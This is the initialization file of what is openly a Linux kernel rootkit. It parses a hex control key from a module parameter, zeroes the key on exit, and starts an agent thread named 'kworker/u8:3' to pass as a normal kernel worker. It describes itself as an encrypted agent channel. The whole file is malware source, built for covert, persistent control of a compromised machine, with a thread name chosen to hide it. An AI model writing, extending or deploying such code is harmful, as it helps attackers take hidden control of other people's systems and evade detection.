// SPDX-License-Identifier: GPL-2.0
/*
 * core/init.c - Module initialization: key parsing and agent thread launch.
 */
#include <linux/hex.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/string.h>

#include "rootkit.h"

static char rk_key_hex[RK_KEY_HEX_LEN + 1];
module_param_string(control_key, rk_key_hex, sizeof(rk_key_hex), 0);

u8 rk_key[RK_KEY_LEN];

static struct task_struct *rk_thread;

static int __init rk_init(void)
{
	if (strlen(rk_key_hex) == 0)
		return -EINVAL;
	if (strlen(rk_key_hex) != RK_KEY_HEX_LEN)
		return -EINVAL;
	if (hex2bin(rk_key, rk_key_hex, RK_KEY_LEN) < 0)
		return -EINVAL;

	memzero_explicit(rk_key_hex, sizeof(rk_key_hex));

	rk_thread = kthread_run(rk_agent_thread, NULL, "kworker/u8:3");
	if (IS_ERR(rk_thread)) {
		memzero_explicit(rk_key, sizeof(rk_key));
		return PTR_ERR(rk_thread);
	}

	return 0;
}

static void __exit rk_exit(void)
{
	if (rk_thread)
		kthread_stop(rk_thread);
	memzero_explicit(rk_key, sizeof(rk_key));
}

module_init(rk_init);
module_exit(rk_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Encrypted agent channel with AES-256-GCM");
